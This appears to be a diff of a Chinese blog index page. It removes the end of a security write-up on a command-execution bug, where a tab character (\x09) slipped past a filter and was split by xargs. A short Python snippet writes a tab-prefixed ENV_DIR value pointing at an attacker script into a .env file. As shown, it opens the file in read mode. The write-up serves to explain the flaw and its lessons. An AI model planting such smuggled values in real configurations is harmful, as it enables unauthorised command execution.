-<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
-<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
-<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
   </nav>
@@ -454,7 +629,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
